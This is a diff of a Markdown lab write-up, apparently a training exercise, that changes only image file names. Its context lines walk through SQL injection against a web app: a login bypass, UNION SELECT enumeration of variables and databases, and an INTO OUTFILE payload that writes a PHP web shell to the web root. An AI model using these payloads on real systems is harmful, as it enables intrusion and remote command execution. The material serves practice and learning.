@@ -6,13 +6,13 @@ First I can see a login, try to sqli basic -->
 admin' or 1=1-- -
 ```
 
-<figure><img src="../../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then, i can see search panel and info of names, i test if this field is vulnerable:
 
-<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (36) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 It is vulnerable, true. Now i try to connect to unions select -->
 
@@ -20,7 +20,7 @@ It is vulnerable, true. Now i try to connect to unions select -->
 ADAM' UNION SELECT 1,2,3,4,5-- -
 ```
 
-<figure><img src="../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (37) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice try daddy, now i list the secure\_file\_priv, to view if this field is vulnerable:
 
@@ -28,7 +28,7 @@ Nice try daddy, now i list the secure\_file\_priv, to view if this field is vuln
 ADAM' UNION SELECT 1,2, variable_name, variable_value, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 ```
 
-<figure><img src="../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (38) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now, i try to upload a webshell -->
 
@@ -36,7 +36,7 @@ Now, i try to upload a webshell -->
 adam' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- -
 ```
 
-<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (39) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/kunqia-ltyeri.gif" alt=""><figcaption></figcaption></figure>
 
@@ -46,7 +46,7 @@ No problem, i will try display the bbdd and password of admin to login and do it
 ADAM' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -
 ```
 
-<figure><img src="../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (41) (1).png" alt=""><figcaption></figcaption></figure>
 
 List all bbdd, and see ilfreight and backup, nice. I see with database(), what ddbb is using this webapp:
 
